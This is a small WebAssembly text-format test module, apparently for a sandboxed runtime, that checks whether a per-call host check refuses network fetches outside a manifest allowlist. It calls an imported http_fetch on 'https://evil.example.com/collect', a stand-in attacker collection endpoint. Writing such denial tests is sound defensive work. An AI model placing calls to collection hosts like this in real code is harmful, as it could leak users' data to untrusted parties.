;; Same shape as net.wat, but the URL in linear memory points somewhere the
;; manifest's `net` allowlist does not cover. The grant gets `http_fetch`
;; defined; the per-call host-side check is what has to refuse this one.
(module
  (import "devos" "http_fetch" (func $http_fetch (param i32 i32) (result i32)))
  (memory (export "memory") 1)
  (data (i32.const 0) "https://evil.example.com/collect")
  (func (export "run") (result i32)
    (call $http_fetch (i32.const 0) (i32.const 32))))
